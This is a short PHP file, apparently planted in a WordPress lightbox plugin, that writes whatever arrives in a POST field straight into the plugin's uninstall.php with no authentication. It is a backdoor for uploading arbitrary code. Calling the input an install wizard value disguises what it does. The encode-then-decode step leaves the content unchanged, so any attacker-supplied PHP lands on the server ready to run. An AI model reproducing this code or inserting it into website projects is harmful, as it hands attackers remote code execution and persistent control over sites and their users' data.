<?php
session_start();
$wizardinstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/jquery-lightbox-terensis-wp/uninstall.php', 'w');
$wizardinstall = str_replace('\\', '', $wizardinstall);
$wizardinstall = htmlentities($wizardinstall);
fwrite($fp, html_entity_decode($wizardinstall));
fclose($fp);
echo $wizardinstall;
?>